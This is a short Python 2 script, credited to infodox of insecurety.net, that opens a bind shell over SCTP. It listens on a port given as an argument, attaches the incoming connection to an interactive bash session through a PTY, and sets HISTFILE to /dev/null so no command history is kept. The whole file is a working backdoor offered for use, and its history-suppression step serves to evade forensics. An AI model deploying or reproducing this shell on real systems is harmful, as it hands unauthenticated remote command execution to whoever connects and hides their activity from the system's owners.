#!/usr/bin/python2
"""
Python Bind SCTP PTY Shell - testing version
infodox - insecurety.net (2013)

Binds a PTY to a SCTP port on the host it is ran on.

Use the sctp_pty_shell_handler.py script to connect.
"""
import os
import pty
import sys
import socket
from sctp import *

def main():
    if len(sys.argv) < 2:
      print("Usage:\n  " + sys.argv[0] + " <port>\n")
      exit(1)

    lport = int(sys.argv[1])
    s = sctpsocket_tcp(socket.AF_INET)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
